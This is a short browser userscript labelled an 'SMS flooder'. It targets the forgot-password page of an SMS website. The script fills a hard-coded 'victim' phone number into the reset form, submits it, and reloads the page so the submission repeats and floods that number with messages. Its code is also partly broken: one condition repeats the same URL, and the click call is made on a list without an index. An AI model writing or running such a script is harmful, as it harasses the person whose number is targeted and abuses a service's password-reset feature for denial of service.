// ==UserScript==
// @name          Anonymous SMS56300.COM sms flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*sms56300.com/*
// ==/UserScript==

var victim=8051210009; //Enter victims number here

if(document.location=="http://www.sms56300.com/ForgotPassword.aspx"||document.location=="http://www.sms56300.com/ForgotPassword.aspx")
{
document.getElementsByName("ctl00_ContentPlaceHolder1_tbemail")[0].value=victim;
document.getElementsByName("ctl00_ContentPlaceHolder1_btnsubmit").click();
}

if(document.location=="http://www.sms56300.com/ForgotPassword.aspx")
document.location="http://www.sms56300.com/ForgotPassword.aspx"